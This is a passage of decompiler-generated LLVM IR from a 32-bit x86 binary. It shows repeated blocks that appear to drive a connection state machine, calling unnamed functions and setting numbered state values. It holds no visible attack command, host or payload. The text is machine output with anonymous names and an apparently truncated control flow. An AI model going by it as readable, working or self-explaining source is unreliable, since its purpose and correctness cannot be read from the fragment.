  %v2_8051620 = inttoptr i32 %v1_8051620 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v2_8051620, align 4
  %v0_8051625 = load i32, i32* @edi, align 4
  %v1_8051625 = add i32 %v0_8051625, 4
  %v2_8051625 = inttoptr i32 %v1_8051625 to i32*
  %v3_8051625 = load i32, i32* %v2_8051625, align 4
  store i32 %v3_8051625, i32* %ecx.global-to-local, align 4
  %v2_8051628 = add i32 %v0_8051619, -16
  %v3_8051628 = inttoptr i32 %v2_8051628 to i32*
  store i32 %v3_8051625, i32* %v3_8051628, align 4
  %v0_8051629 = call i32 @function_8053304()
  store i32 %v0_8051629, i32* %eax.global-to-local, align 4
  %v0_8051631 = load i32, i32* @edi, align 4
  %v1_8051631 = add i32 %v0_8051631, 12
  %v2_8051631 = inttoptr i32 %v1_8051631 to i32*
  store i32 5, i32* %v2_8051631, align 4
  br label %dec_label_pc_8051321

dec_label_pc_805163d:                             ; preds = %dec_label_pc_8051229, %dec_label_pc_8051220, %dec_label_pc_8051217, %dec_label_pc_805120e, %dec_label_pc_8051201
  %v1_805163d = add i32 %v0_805163d, 1
  store i32 %v1_805163d, i32* @ebp, align 4
  %v10_8051640 = icmp eq i32 %v0_805163d, -2
  br i1 %v10_8051640, label %dec_label_pc_8050fb2.loopexit12.loopexit, label %dec_label_pc_8051649

dec_label_pc_8051649:                             ; preds = %dec_label_pc_805163d
  %tmp150 = icmp slt i32 %v1_805163d, 1
  br i1 %tmp150, label %dec_label_pc_8051453, label %dec_label_pc_8051651

dec_label_pc_8051651:                             ; preds = %dec_label_pc_8051649
  %v0_8051651 = load i32, i32* @esp, align 4
  %v1_8051654 = add i32 %v0_8051651, -16
  %v2_8051654 = inttoptr i32 %v1_8051654 to i32*
  store i32 22, i32* %v2_8051654, align 4
  %v2_8051656 = call i32 @function_8051cd0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051656, i32* %eax.global-to-local, align 4
  %v0_805165b = load i32, i32* @esp, align 4
  %v1_805165b = inttoptr i32 %v0_805165b to i32*
  %v2_805165b = load i32, i32* %v1_805165b, align 4
  store i32 %v2_805165b, i32* %eax.global-to-local, align 4
  %v3_805165b = add i32 %v0_805165b, 4
  %v1_805165c = inttoptr i32 %v3_805165b to i32*
  %v2_805165c = load i32, i32* %v1_805165c, align 4
  store i32 %v2_805165c, i32* %edx.global-to-local, align 4
  %v1_805165d = add i32 %v0_805165b, 1888
  store i32 %v1_805165d, i32* %eax.global-to-local, align 4
  store i32 %v1_805165d, i32* %v1_805165c, align 4
  store i32 22, i32* %v1_805165b, align 4
  %v3_8051667 = call i32 @function_8051c20(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8051667, i32* %eax.global-to-local, align 4
  %v0_805166c = load i32, i32* @esp, align 4
  %v1_805166c = add i32 %v0_805166c, -4
  %v2_805166c = inttoptr i32 %v1_805166c to i32*
  store i32 16384, i32* %v2_805166c, align 4
  %v1_8051671 = add i32 %v0_805166c, 1888
  %v2_8051671 = inttoptr i32 %v1_8051671 to i32*
  %v3_8051671 = load i32, i32* %v2_8051671, align 4
  store i32 %v3_8051671, i32* @esi, align 4
  %v2_8051678 = add i32 %v0_805166c, -8
  %v3_8051678 = inttoptr i32 %v2_8051678 to i32*
  store i32 %v3_8051671, i32* %v3_8051678, align 4
  %v2_8051679 = add i32 %v0_805166c, -12
  %v3_8051679 = inttoptr i32 %v2_8051679 to i32*
  store i32 %v3_8051667, i32* %v3_8051679, align 4
  %v0_805167a = load i32, i32* @edi, align 4
  %v1_805167a = add i32 %v0_805167a, 4
  %v2_805167a = inttoptr i32 %v1_805167a to i32*
  %v3_805167a = load i32, i32* %v2_805167a, align 4
  store i32 %v3_805167a, i32* @ebx, align 4
  %v2_805167d = add i32 %v0_805166c, -16
  %v3_805167d = inttoptr i32 %v2_805167d to i32*
  store i32 %v3_805167a, i32* %v3_805167d, align 4
  %v0_805167e = call i32 @function_8053304()
  store i32 %v0_805167e, i32* %eax.global-to-local, align 4
  %v0_8051683 = load i32, i32* @esp, align 4
  %v1_8051686 = add i32 %v0_8051683, 28
  %v2_8051686 = inttoptr i32 %v1_8051686 to i32*
  store i32 16384, i32* %v2_8051686, align 4
  %v1_805168b = add i32 %v0_8051683, 24
  %v2_805168b = inttoptr i32 %v1_805168b to i32*
  store i32 2, i32* %v2_805168b, align 4
  %v1_805168d = add i32 %v0_8051683, 20
  %v2_805168d = inttoptr i32 %v1_805168d to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v2_805168d, align 4
  %v0_8051692 = load i32, i32* @edi, align 4
  %v1_8051692 = add i32 %v0_8051692, 4
  %v2_8051692 = inttoptr i32 %v1_8051692 to i32*
  %v3_8051692 = load i32, i32* %v2_8051692, align 4
  store i32 %v3_8051692, i32* %ecx.global-to-local, align 4
  %v2_8051695 = add i32 %v0_8051683, 16
  %v3_8051695 = inttoptr i32 %v2_8051695 to i32*
  store i32 %v3_8051692, i32* %v3_8051695, align 4
  %v0_8051696 = call i32 @function_8053304()
  store i32 %v0_8051696, i32* %eax.global-to-local, align 4
  %v0_805169b = load i32, i32* @esp, align 4
  %v1_805169b = inttoptr i32 %v0_805169b to i32*
  store i32 22, i32* %v1_805169b, align 4
  %v2_80516a2 = call i32 @function_8051c50(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80516a2, i32* %eax.global-to-local, align 4
  %v0_80516aa = load i32, i32* @edi, align 4
  %v1_80516aa = add i32 %v0_80516aa, 12
  %v2_80516aa = inttoptr i32 %v1_80516aa to i32*
  store i32 7, i32* %v2_80516aa, align 4
  br label %dec_label_pc_8051321

dec_label_pc_80516b6:                             ; preds = %dec_label_pc_8051437, %dec_label_pc_805142e, %dec_label_pc_8051425, %dec_label_pc_805141c, %dec_label_pc_805140f
  %v1_80516b6 = add i32 %v0_80516b6, 1
  store i32 %v1_80516b6, i32* @ebp, align 4
  %v10_80516b9 = icmp eq i32 %v0_80516b6, -2
  br i1 %v10_80516b9, label %dec_label_pc_8050fb2.loopexit12.loopexit, label %dec_label_pc_80516c2

dec_label_pc_80516c2:                             ; preds = %dec_label_pc_80516b6
  %tmp151 = icmp slt i32 %v1_80516b6, 1
  br i1 %tmp151, label %dec_label_pc_8051453, label %dec_label_pc_80516ca

dec_label_pc_80516ca:                             ; preds = %dec_label_pc_80516c2
  %v0_80516ca = load i32, i32* @esp, align 4
  %v1_80516cd = add i32 %v0_80516ca, -16
  %v2_80516cd = inttoptr i32 %v1_80516cd to i32*
  store i32 24, i32* %v2_80516cd, align 4
  %v2_80516cf = call i32 @function_8051cd0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80516cf, i32* %eax.global-to-local, align 4
  %v0_80516d4 = load i32, i32* @esp, align 4
  %v1_80516d4 = inttoptr i32 %v0_80516d4 to i32*
  %v2_80516d4 = load i32, i32* %v1_80516d4, align 4
  store i32 %v2_80516d4, i32* %eax.global-to-local, align 4
  %v3_80516d4 = add i32 %v0_80516d4, 4
  %v1_80516d5 = inttoptr i32 %v3_80516d4 to i32*
  %v1_80516d6 = add i32 %v0_80516d4, 1880
  store i32 %v1_80516d6, i32* %edx.global-to-local, align 4
  store i32 %v1_80516d6, i32* %v1_80516d5, align 4
  store i32 24, i32* %v1_80516d4, align 4
  %v3_80516e0 = call i32 @function_8051c20(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_80516e0, i32* %eax.global-to-local, align 4
  %v0_80516e5 = load i32, i32* @esp, align 4
  %v1_80516e5 = add i32 %v0_80516e5, -4
  %v2_80516e5 = inttoptr i32 %v1_80516e5 to i32*
  store i32 16384, i32* %v2_80516e5, align 4
  %v1_80516ea = add i32 %v0_80516e5, 1880
  %v2_80516ea = inttoptr i32 %v1_80516ea to i32*
  %v3_80516ea = load i32, i32* %v2_80516ea, align 4
  store i32 %v3_80516ea, i32* @esi, align 4
  %v2_80516f1 = add i32 %v0_80516e5, -8
  %v3_80516f1 = inttoptr i32 %v2_80516f1 to i32*
  store i32 %v3_80516ea, i32* %v3_80516f1, align 4
  %v2_80516f2 = add i32 %v0_80516e5, -12
  %v3_80516f2 = inttoptr i32 %v2_80516f2 to i32*
  store i32 %v3_80516e0, i32* %v3_80516f2, align 4
  %v0_80516f3 = load i32, i32* @edi, align 4
  %v1_80516f3 = add i32 %v0_80516f3, 4
  %v2_80516f3 = inttoptr i32 %v1_80516f3 to i32*
  %v3_80516f3 = load i32, i32* %v2_80516f3, align 4
  store i32 %v3_80516f3, i32* @ebx, align 4
  %v2_80516f6 = add i32 %v0_80516e5, -16
  %v3_80516f6 = inttoptr i32 %v2_80516f6 to i32*
  store i32 %v3_80516f3, i32* %v3_80516f6, align 4
  %v0_80516f7 = call i32 @function_8053304()
  store i32 %v0_80516f7, i32* %eax.global-to-local, align 4
  %v0_80516fc = load i32, i32* @esp, align 4
  %v1_80516ff = add i32 %v0_80516fc, 28
  %v2_80516ff = inttoptr i32 %v1_80516ff to i32*
  store i32 16384, i32* %v2_80516ff, align 4
  %v1_8051704 = add i32 %v0_80516fc, 24
  %v2_8051704 = inttoptr i32 %v1_8051704 to i32*
  store i32 2, i32* %v2_8051704, align 4
  %v1_8051706 = add i32 %v0_80516fc, 20
  %v2_8051706 = inttoptr i32 %v1_8051706 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v2_8051706, align 4
  %v0_805170b = load i32, i32* @edi, align 4
  %v1_805170b = add i32 %v0_805170b, 4
  %v2_805170b = inttoptr i32 %v1_805170b to i32*
  %v3_805170b = load i32, i32* %v2_805170b, align 4
  store i32 %v3_805170b, i32* %ecx.global-to-local, align 4
  %v2_805170e = add i32 %v0_80516fc, 16
  %v3_805170e = inttoptr i32 %v2_805170e to i32*
  store i32 %v3_805170b, i32* %v3_805170e, align 4
  %v0_805170f = call i32 @function_8053304()
  store i32 %v0_805170f, i32* %eax.global-to-local, align 4
  %v0_8051714 = load i32, i32* @esp, align 4
  %v1_8051714 = inttoptr i32 %v0_8051714 to i32*
  store i32 24, i32* %v1_8051714, align 4
  %v2_805171b = call i32 @function_8051c50(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_805171b, i32* %eax.global-to-local, align 4
  %v0_8051723 = load i32, i32* @edi, align 4
  %v1_8051723 = add i32 %v0_8051723, 12
  %v2_8051723 = inttoptr i32 %v1_8051723 to i32*
  store i32 10, i32* %v2_8051723, align 4
  br label %dec_label_pc_8051321

dec_label_pc_805172f:                             ; preds = %dec_label_pc_80511e4, %dec_label_pc_80511db, %dec_label_pc_80511d2, %dec_label_pc_80511c9, %dec_label_pc_80511bc
  %v1_805172f = add i32 %v0_805172f, 1
  store i32 %v1_805172f, i32* @ebp, align 4
  %v10_8051732 = icmp eq i32 %v0_805172f, -2
  br i1 %v10_8051732, label %dec_label_pc_8050fb2.loopexit12.loopexit, label %dec_label_pc_805173b

dec_label_pc_805173b:                             ; preds = %dec_label_pc_805172f
  %tmp152 = icmp slt i32 %v1_805172f, 1
  br i1 %tmp152, label %dec_label_pc_8051453, label %dec_label_pc_8051743

dec_label_pc_8051743:                             ; preds = %dec_label_pc_805173b
  %v0_8051743 = load i32, i32* @esp, align 4
  %v1_8051746 = add i32 %v0_8051743, -16
  %v2_8051746 = inttoptr i32 %v1_8051746 to i32*
  store i32 23, i32* %v2_8051746, align 4
  %v2_8051748 = call i32 @function_8051cd0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051748, i32* %eax.global-to-local, align 4
  %v0_805174d = load i32, i32* @esp, align 4
  %v1_805174d = inttoptr i32 %v0_805174d to i32*
  %v2_805174d = load i32, i32* %v1_805174d, align 4
  store i32 %v2_805174d, i32* %eax.global-to-local, align 4
  %v3_805174d = add i32 %v0_805174d, 4
  %v1_805174e = inttoptr i32 %v3_805174d to i32*
  %v2_805174e = load i32, i32* %v1_805174e, align 4
  store i32 %v2_805174e, i32* %edx.global-to-local, align 4
  %v1_805174f = add i32 %v0_805174d, 1880
  store i32 %v1_805174f, i32* %eax.global-to-local, align 4
  store i32 %v1_805174f, i32* %v1_805174e, align 4
  store i32 23, i32* %v1_805174d, align 4
  %v3_8051759 = call i32 @function_8051c20(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8051759, i32* %eax.global-to-local, align 4
  %v0_805175e = load i32, i32* @esp, align 4
  %v1_805175e = add i32 %v0_805175e, -4
  %v2_805175e = inttoptr i32 %v1_805175e to i32*
  store i32 16384, i32* %v2_805175e, align 4
  %v1_8051763 = add i32 %v0_805175e, 1880
  %v2_8051763 = inttoptr i32 %v1_8051763 to i32*
  %v3_8051763 = load i32, i32* %v2_8051763, align 4
  store i32 %v3_8051763, i32* @esi, align 4
  %v2_805176a = add i32 %v0_805175e, -8
  %v3_805176a = inttoptr i32 %v2_805176a to i32*
  store i32 %v3_8051763, i32* %v3_805176a, align 4
  %v2_805176b = add i32 %v0_805175e, -12
  %v3_805176b = inttoptr i32 %v2_805176b to i32*
  store i32 %v3_8051759, i32* %v3_805176b, align 4
  %v0_805176c = load i32, i32* @edi, align 4
  %v1_805176c = add i32 %v0_805176c, 4
  %v2_805176c = inttoptr i32 %v1_805176c to i32*
  %v3_805176c = load i32, i32* %v2_805176c, align 4
  store i32 %v3_805176c, i32* @ebx, align 4
  %v2_805176f = add i32 %v0_805175e, -16
  %v3_805176f = inttoptr i32 %v2_805176f to i32*
  store i32 %v3_805176c, i32* %v3_805176f, align 4
  %v0_8051770 = call i32 @function_8053304()
  store i32 %v0_8051770, i32* %eax.global-to-local, align 4
  %v0_8051775 = load i32, i32* @esp, align 4
  %v1_8051778 = add i32 %v0_8051775, 28
  %v2_8051778 = inttoptr i32 %v1_8051778 to i32*
  store i32 16384, i32* %v2_8051778, align 4
  %v1_805177d = add i32 %v0_8051775, 24
  %v2_805177d = inttoptr i32 %v1_805177d to i32*
  store i32 2, i32* %v2_805177d, align 4
  %v1_805177f = add i32 %v0_8051775, 20
  %v2_805177f = inttoptr i32 %v1_805177f to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v2_805177f, align 4
  %v0_8051784 = load i32, i32* @edi, align 4
  %v1_8051784 = add i32 %v0_8051784, 4
  %v2_8051784 = inttoptr i32 %v1_8051784 to i32*
  %v3_8051784 = load i32, i32* %v2_8051784, align 4
  store i32 %v3_8051784, i32* %ecx.global-to-local, align 4
  %v2_8051787 = add i32 %v0_8051775, 16
  %v3_8051787 = inttoptr i32 %v2_8051787 to i32*
  store i32 %v3_8051784, i32* %v3_8051787, align 4
  %v0_8051788 = call i32 @function_8053304()
  store i32 %v0_8051788, i32* %eax.global-to-local, align 4
  %v0_805178d = load i32, i32* @esp, align 4
  %v1_805178d = inttoptr i32 %v0_805178d to i32*
  store i32 23, i32* %v1_805178d, align 4
  %v2_8051794 = call i32 @function_8051c50(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051794, i32* %eax.global-to-local, align 4
  %v0_805179c = load i32, i32* @edi, align 4
  %v1_805179c = add i32 %v0_805179c, 12
  %v2_805179c = inttoptr i32 %v1_805179c to i32*
  store i32 9, i32* %v2_805179c, align 4
  br label %dec_label_pc_8051321

dec_label_pc_80517a8:                             ; preds = %dec_label_pc_8050fa6, %dec_label_pc_8050f9d, %dec_label_pc_8050f94, %dec_label_pc_8050f8b, %dec_label_pc_8050f7e
  %v1_80517a8 = add i32 %v0_80517a8, 1
  store i32 %v1_80517a8, i32* @ebp, align 4
  %v10_80517ab = icmp eq i32 %v0_80517a8, -2
  br i1 %v10_80517ab, label %dec_label_pc_8050fb2.loopexit12.loopexit, label %dec_label_pc_80517b4

dec_label_pc_80517b4:                             ; preds = %dec_label_pc_80517a8
  %tmp153 = icmp slt i32 %v1_80517a8, 1
  br i1 %tmp153, label %dec_label_pc_8051453, label %dec_label_pc_80517bc

dec_label_pc_80517bc:                             ; preds = %dec_label_pc_80517b4
  %v0_80517bc = load i32, i32* @esp, align 4
  %v1_80517bf = add i32 %v0_80517bc, -16
  %v2_80517bf = inttoptr i32 %v1_80517bf to i32*
  store i32 21, i32* %v2_80517bf, align 4
  %v2_80517c1 = call i32 @function_8051cd0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80517c1, i32* %eax.global-to-local, align 4
  %v0_80517c6 = load i32, i32* @esp, align 4
  %v1_80517c6 = inttoptr i32 %v0_80517c6 to i32*
  %v2_80517c6 = load i32, i32* %v1_80517c6, align 4
  store i32 %v2_80517c6, i32* %eax.global-to-local, align 4
  %v3_80517c6 = add i32 %v0_80517c6, 4
  %v1_80517c7 = inttoptr i32 %v3_80517c6 to i32*
  %v2_80517c7 = load i32, i32* %v1_80517c7, align 4
  store i32 %v2_80517c7, i32* %edx.global-to-local, align 4
  %v1_80517c8 = add i32 %v0_80517c6, 1880
  store i32 %v1_80517c8, i32* %ecx.global-to-local, align 4
  store i32 %v1_80517c8, i32* %v1_80517c7, align 4
  store i32 21, i32* %v1_80517c6, align 4
  %v3_80517d2 = call i32 @function_8051c20(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_80517d2, i32* %eax.global-to-local, align 4
  %v0_80517d7 = load i32, i32* @esp, align 4
  %v1_80517d7 = add i32 %v0_80517d7, -4
  %v2_80517d7 = inttoptr i32 %v1_80517d7 to i32*
  store i32 16384, i32* %v2_80517d7, align 4
  %v1_80517dc = add i32 %v0_80517d7, 1880
  %v2_80517dc = inttoptr i32 %v1_80517dc to i32*
  %v3_80517dc = load i32, i32* %v2_80517dc, align 4
  store i32 %v3_80517dc, i32* @esi, align 4
  %v2_80517e3 = add i32 %v0_80517d7, -8
  %v3_80517e3 = inttoptr i32 %v2_80517e3 to i32*
  store i32 %v3_80517dc, i32* %v3_80517e3, align 4
  %v2_80517e4 = add i32 %v0_80517d7, -12
  %v3_80517e4 = inttoptr i32 %v2_80517e4 to i32*
  store i32 %v3_80517d2, i32* %v3_80517e4, align 4
  %v0_80517e5 = load i32, i32* @edi, align 4
  %v1_80517e5 = add i32 %v0_80517e5, 4
  %v2_80517e5 = inttoptr i32 %v1_80517e5 to i32*
  %v3_80517e5 = load i32, i32* %v2_80517e5, align 4
  store i32 %v3_80517e5, i32* @ebx, align 4
  %v2_80517e8 = add i32 %v0_80517d7, -16
  %v3_80517e8 = inttoptr i32 %v2_80517e8 to i32*
  store i32 %v3_80517e5, i32* %v3_80517e8, align 4
  %v0_80517e9 = call i32 @function_8053304()
  store i32 %v0_80517e9, i32* %eax.global-to-local, align 4
  %v0_80517ee = load i32, i32* @esp, align 4
  %v1_80517f1 = add i32 %v0_80517ee, 28
  %v2_80517f1 = inttoptr i32 %v1_80517f1 to i32*
  store i32 16384, i32* %v2_80517f1, align 4
  %v1_80517f6 = add i32 %v0_80517ee, 24
  %v2_80517f6 = inttoptr i32 %v1_80517f6 to i32*
  store i32 2, i32* %v2_80517f6, align 4
  %v1_80517f8 = add i32 %v0_80517ee, 20
  %v2_80517f8 = inttoptr i32 %v1_80517f8 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v2_80517f8, align 4
  %v0_80517fd = load i32, i32* @edi, align 4
  %v1_80517fd = add i32 %v0_80517fd, 4
  %v2_80517fd = inttoptr i32 %v1_80517fd to i32*
  %v3_80517fd = load i32, i32* %v2_80517fd, align 4
  store i32 %v3_80517fd, i32* %ecx.global-to-local, align 4
  %v2_8051800 = add i32 %v0_80517ee, 16
  %v3_8051800 = inttoptr i32 %v2_8051800 to i32*
  store i32 %v3_80517fd, i32* %v3_8051800, align 4
  %v0_8051801 = call i32 @function_8053304()
  store i32 %v0_8051801, i32* %eax.global-to-local, align 4
  %v0_8051806 = load i32, i32* @esp, align 4
  %v1_8051806 = inttoptr i32 %v0_8051806 to i32*
  store i32 21, i32* %v1_8051806, align 4
  %v2_805180d = call i32 @function_8051c50(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_805180d, i32* %eax.global-to-local, align 4
  %v0_8051815 = load i32, i32* @edi, align 4
  %v1_8051815 = add i32 %v0_8051815, 12
  %v2_8051815 = inttoptr i32 %v1_8051815 to i32*
  store i32 6, i32* %v2_8051815, align 4
  br label %dec_label_pc_8051321

dec_label_pc_8051821:                             ; preds = %dec_label_pc_8051240
  %v2_805182b = load i32, i32* %v1_805182b, align 4
  store i32 %v2_805182b, i32* %eax.global-to-local, align 4
  %v0_805182c = load i32, i32* @edi, align 4
  %v1_805182c = add i32 %v0_805182c, 4
  %v2_805182c = inttoptr i32 %v1_805182c to i32*
  %v3_805182c = load i32, i32* %v2_805182c, align 4
  store i32 %v3_805182c, i32* %eax.global-to-local, align 4
  store i32 %v3_805182c, i32* %v1_805182b, align 4
  %v1_8051830 = call i32 @function_8052bc1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8051830, i32* %eax.global-to-local, align 4
  %v0_8051835 = load i32, i32* @edi, align 4
  %v1_8051835 = add i32 %v0_8051835, 284
  %v2_8051835 = inttoptr i32 %v1_8051835 to i8*
  %v3_8051835 = load i8, i8* %v2_8051835, align 1
  %v4_8051835 = zext i8 %v3_8051835 to i32
  %v6_8051835 = and i32 %v1_8051830, -256
  %v7_8051835 = or i32 %v4_8051835, %v6_8051835
  %v1_805183e = add i32 %v7_8051835, 1
  store i32 %v1_805183e, i32* %eax.global-to-local, align 4
  %v1_805183f = add i32 %v0_8051835, 4
  %v2_805183f = inttoptr i32 %v1_805183f to i32*
  store i32 -1, i32* %v2_805183f, align 4
  %v0_8051846 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051846 = trunc i32 %v0_8051846 to i8
  %v2_8051846 = load i32, i32* @edi, align 4
  %v3_8051846 = add i32 %v2_8051846, 284
  %v4_8051846 = inttoptr i32 %v3_8051846 to i8*
  store i8 %v1_8051846, i8* %v4_8051846, align 1
  %v0_805184c = load i32, i32* %eax.global-to-local, align 4
  %v1_805184c = trunc i32 %v0_805184c to i8
  %v10_805184c = icmp eq i8 %v1_805184c, 10
  %v1_805184e = icmp eq i1 %v10_805184c, false
  br i1 %v1_805184e, label %dec_label_pc_80519e0, label %dec_label_pc_8051854

dec_label_pc_8051854:                             ; preds = %dec_label_pc_8051821
  store i32 -1, i32* @ebp, align 4
  %v0_8051857 = load i32, i32* @edi, align 4
  %v1_8051857 = add i32 %v0_8051857, 284
  %v2_8051857 = inttoptr i32 %v1_8051857 to i8*
  store i8 0, i8* %v2_8051857, align 1
  %v0_805185e = load i32, i32* @edi, align 4
  %v1_805185e = add i32 %v0_805185e, 12
  %v2_805185e = inttoptr i32 %v1_805185e to i32*
  store i32 0, i32* %v2_805185e, align 4
  br label %dec_label_pc_8051321

dec_label_pc_805186a:                             ; preds = %dec_label_pc_80514d4
  %v1_805186a = add i32 %v0_80514c0, -4
  %v2_805186a = inttoptr i32 %v1_805186a to i32*
  store i32 16384, i32* %v2_805186a, align 4
  %v1_805186f = add i32 %v0_80514c0, -8
  %v2_805186f = inttoptr i32 %v1_805186f to i32*
  store i32 3, i32* %v2_805186f, align 4
  %v1_8051871 = add i32 %v0_80514c0, 1879
  store i32 %v1_8051871, i32* %eax.global-to-local, align 4
  %v0_8051878 = load i32, i32* @ebx, align 4
  %v1_8051878 = add i32 %v0_8051878, 3
  store i32 %v1_8051878, i32* @ebx, align 4
  %v2_805187b = add i32 %v0_80514c0, -12
  %v3_805187b = inttoptr i32 %v2_805187b to i32*
  store i32 %v1_8051871, i32* %v3_805187b, align 4
  %v0_805187c = load i32, i32* @ebp, align 4
  %v1_805187c = add i32 %v0_805187c, 3
  store i32 %v1_805187c, i32* @ebp, align 4
  %v0_805187f = load i32, i32* @edi, align 4
  %v1_805187f = add i32 %v0_805187f, 4
  %v2_805187f = inttoptr i32 %v1_805187f to i32*
  %v3_805187f = load i32, i32* %v2_805187f, align 4
  store i32 %v3_805187f, i32* @esi, align 4
  %v2_8051882 = add i32 %v0_80514c0, -16
  %v3_8051882 = inttoptr i32 %v2_8051882 to i32*
  store i32 %v3_805187f, i32* %v3_8051882, align 4
  %v0_8051883 = call i32 @function_8053304()
  %v0_8051888 = load i32, i32* @esp, align 4
  %v1_8051888 = add i32 %v0_8051888, -4
  %v2_8051888 = inttoptr i32 %v1_8051888 to i32*
  store i32 16384, i32* %v2_8051888, align 4
  %v1_805188d = add i32 %v0_8051888, -8
  %v2_805188d = inttoptr i32 %v1_805188d to i32*
  store i32 9, i32* %v2_805188d, align 4
  %v1_805188f = add i32 %v0_8051888, 1863
  store i32 %v1_805188f, i32* %eax.global-to-local, align 4
  %v2_8051896 = add i32 %v0_8051888, -12
  %v3_8051896 = inttoptr i32 %v2_8051896 to i32*
  store i32 %v1_805188f, i32* %v3_8051896, align 4
  %v0_8051897 = load i32, i32* @edi, align 4
  %v1_8051897 = add i32 %v0_8051897, 4
  %v2_8051897 = inttoptr i32 %v1_8051897 to i32*
  %v3_8051897 = load i32, i32* %v2_8051897, align 4
  store i32 %v3_8051897, i32* %ecx.global-to-local, align 4
  %v2_805189a = add i32 %v0_8051888, -16
  %v3_805189a = inttoptr i32 %v2_805189a to i32*
  store i32 %v3_8051897, i32* %v3_805189a, align 4
  %v0_805189b = call i32 @function_8053304()
  store i32 %v0_805189b, i32* %eax.global-to-local, align 4
  %v0_80518a0 = load i32, i32* @esp, align 4
  %v1_80518a0 = add i32 %v0_80518a0, 32
  %v0_80518a3 = load i32, i32* @edi, align 4
  %v1_80518a3 = add i32 %v0_80518a3, 24
  %v2_80518a3 = inttoptr i32 %v1_80518a3 to i32*
  %v3_80518a3 = load i32, i32* %v2_80518a3, align 4
  store i32 %v3_80518a3, i32* %edx.global-to-local, align 4
  %v0_805103d.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805103d.backedge

dec_label_pc_80518ab:                             ; preds = %dec_label_pc_8050f27
  %v1_80518ab = add i32 %v0_8050f31, 1872
  %v2_80518ab = inttoptr i32 %v1_80518ab to i32*
  store i32 0, i32* %v2_80518ab, align 4
  %v0_80518b6 = load i32, i32* @esp, align 4
  %v1_80518b6 = add i32 %v0_80518b6, 1864
  %v2_80518b6 = inttoptr i32 %v1_80518b6 to i32*
  store i32 4, i32* %v2_80518b6, align 4
  %v0_80518c1 = load i32, i32* @esp, align 4
  %v1_80518c4 = add i32 %v0_80518c1, 1864
  %v2_80518cb = add i32 %v0_80518c1, -16
  %v3_80518cb = inttoptr i32 %v2_80518cb to i32*
  store i32 %v1_80518c4, i32* %v3_80518cb, align 4
  %v1_80518cc = add i32 %v0_80518c1, 1872
  store i32 %v1_80518cc, i32* %eax.global-to-local, align 4
  %v2_80518d3 = add i32 %v0_80518c1, -20
  %v3_80518d3 = inttoptr i32 %v2_80518d3 to i32*
  store i32 %v1_80518cc, i32* %v3_80518d3, align 4
  %v1_80518d4 = add i32 %v0_80518c1, -24
  %v2_80518d4 = inttoptr i32 %v1_80518d4 to i32*
  store i32 4, i32* %v2_80518d4, align 4
  %v1_80518d6 = add i32 %v0_80518c1, -28
  %v2_80518d6 = inttoptr i32 %v1_80518d6 to i32*
  store i32 1, i32* %v2_80518d6, align 4
  %v0_80518d8 = load i32, i32* @edi, align 4
  %v1_80518d8 = add i32 %v0_80518d8, 4
  %v2_80518d8 = inttoptr i32 %v1_80518d8 to i32*
  %v3_80518d8 = load i32, i32* %v2_80518d8, align 4
  store i32 %v3_80518d8, i32* %eax.global-to-local, align 4
  %v2_80518db = add i32 %v0_80518c1, -32
  %v3_80518db = inttoptr i32 %v2_80518db to i32*
  store i32 %v3_80518d8, i32* %v3_80518db, align 4
  %v0_80518dc = call i32 @function_8053230()
  store i32 %v0_80518dc, i32* %eax.global-to-local, align 4
  %v0_80518e1 = load i32, i32* @esp, align 4
  %v2_80518e4 = add i32 %v0_80518e1, 1904
  %v3_80518e4 = inttoptr i32 %v2_80518e4 to i32*
  %v4_80518e4 = load i32, i32* %v3_80518e4, align 4
  %v5_80518e4 = or i32 %v4_80518e4, %v0_80518dc
  %v6_80518e4 = icmp eq i32 %v5_80518e4, 0
  store i32 %v5_80518e4, i32* %eax.global-to-local, align 4
  %v1_80518eb = icmp eq i1 %v6_80518e4, false
  br i1 %v1_80518eb, label %dec_label_pc_805194c, label %dec_label_pc_80518ed

dec_label_pc_80518ed:                             ; preds = %dec_label_pc_80518ab
  %v0_80518ed = load i32, i32* @edi, align 4
  %v1_80518ed = add i32 %v0_80518ed, 12
  %v2_80518ed = inttoptr i32 %v1_80518ed to i32*
  store i32 2, i32* %v2_80518ed, align 4
  %v1_80518f4 = call i32 @function_804fa40(i32 ptrtoint (i32* @0 to i32))
  %v2_80518f4 = sext i32 %v1_80518f4 to i64
  %v0_80518f9 = load i16, i16* @global_var_80572ec.49, align 4
  %v1_80518f9 = zext i16 %v0_80518f9 to i32
  %v0_8051906 = load i32, i32* @global_var_80572b8.50, align 8
  store i32 %v0_8051906, i32* @ebx, align 4
  store i32 %v1_80518f9, i32* %ecx.global-to-local, align 4
  %v8_8051910 = zext i16 %v0_80518f9 to i64
  %v9_8051910 = udiv i64 %v2_80518f4, %v8_8051910
  %v10_8051910 = trunc i64 %v9_8051910 to i32
  store i32 %v10_8051910, i32* %eax.global-to-local, align 4
  %v11_8051910 = urem i64 %v2_80518f4, %v8_8051910
  %v12_8051910 = trunc i64 %v11_8051910 to i32
  store i32 %v12_8051910, i32* %edx.global-to-local, align 4
  %tmp154 = icmp slt i32 %v0_8051906, 1
  br i1 %tmp154, label %dec_label_pc_8051a11, label %dec_label_pc_805191a

dec_label_pc_805191a:                             ; preds = %dec_label_pc_80518ed
  %v0_805191a = load i32, i32* @global_var_80572e8.51, align 8
